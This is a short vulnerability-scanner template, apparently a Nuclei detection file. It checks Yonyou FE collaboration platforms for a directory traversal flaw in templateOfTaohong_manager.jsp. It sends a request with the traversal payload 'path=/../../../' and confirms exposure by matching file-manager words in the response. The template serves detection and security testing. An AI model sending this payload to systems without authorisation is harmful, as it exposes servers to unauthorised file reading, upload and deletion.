id: yonyou-fe-directory-traversal
info:
  name: Yonyou FE Directory Traversal
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    Yonyou FE collaboration platform directory traversal vulnerability in `templateOfTaohong_manager.jsp` leading to potential file access and manipulation.
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BOA_FE%E5%8D%8F%E4%BD%9C%E5%8A%9E%E5%85%AC%E5%B9%B3%E5%8F%B0_templateOfTaohong_manager.jsp_%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.html
http:
  - raw:
      - |
        GET /system/mediafile/templateOfTaohong_manager.jsp?path=/../../../ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "window.location=\"templateOfTaohong_manager.jsp?path=\""
          - "/download.fe?filePath="
          - "deletefile"
          - "uploadfile"
          - "downloadfile"
